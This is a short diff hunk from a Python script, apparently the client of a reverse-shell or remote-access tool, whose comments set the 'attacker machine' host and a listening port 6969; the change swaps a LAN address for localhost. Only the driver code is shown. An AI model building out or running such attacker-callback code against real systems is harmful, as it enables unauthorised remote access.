@@ -125,7 +125,7 @@ def main(host: str, port: int) -> None:
 # driver code
 if __name__ == "__main__":
 	# ip or domain name of the attacker machine
-	host = "192.168.0.134" # change this
+	host = "127.0.0.1" # change this
 	# listening port of the attacker machine
 	port = 6969 # change this (optional)
 	
